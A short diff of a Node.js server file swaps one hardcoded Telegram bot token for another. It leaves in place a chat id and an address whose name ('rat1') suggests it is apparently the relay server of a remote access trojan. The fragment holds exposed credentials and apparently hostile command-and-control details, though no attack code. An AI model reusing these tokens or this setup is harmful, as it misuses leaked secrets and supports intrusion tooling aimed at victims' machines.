@@ -8,7 +8,7 @@ const bodyParser = require('body-parser')
 const axios = require("axios");
 const PORT = 3000;
 
-const token = '7833060237:AAGYt8nKFRLHXi2DoTTePcEJVcDabcR-P3s'
+const token = '7144522875:AAEFGYd8mx8p3wvfpBozxW5Ea5L-XEG2y2M'
 const id = '1784606556'
 const address = 'https://rat1-1-lfu0.onrender.com/'
 
